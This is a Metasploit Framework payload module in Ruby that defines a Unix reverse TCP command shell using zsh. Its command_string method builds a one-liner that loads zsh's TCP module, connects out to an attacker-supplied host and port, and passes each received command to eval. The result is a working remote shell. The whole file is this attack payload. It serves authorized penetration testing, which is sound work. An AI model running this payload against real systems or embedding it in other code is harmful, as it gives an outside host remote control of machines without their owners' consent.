##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  CachedSize = 110

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Unix Command Shell, Reverse TCP (via Zsh)',
      'Description' => %q{
        Connect back and create a command shell via Zsh.  Note: Although Zsh is often
        available, please be aware it isn't usually installed by default.
      },
      'Author'      => 'Doug Prostko <dougtko[at]gmail.com>',
      'License'     => MSF_LICENSE,
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'cmd',
      'RequiredCmd' => 'zsh',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  def generate
    return super + command_string
  end

  def command_string
    cmd = "zmodload zsh/net/tcp;"
    cmd << "ztcp #{datastore['LHOST']} #{datastore['LPORT']};"
    cmd << "while read -r cmd <&$REPLY;do eval ${cmd} >&$REPLY;done;"
    cmd << "ztcp -c"
    cmd
  end
end
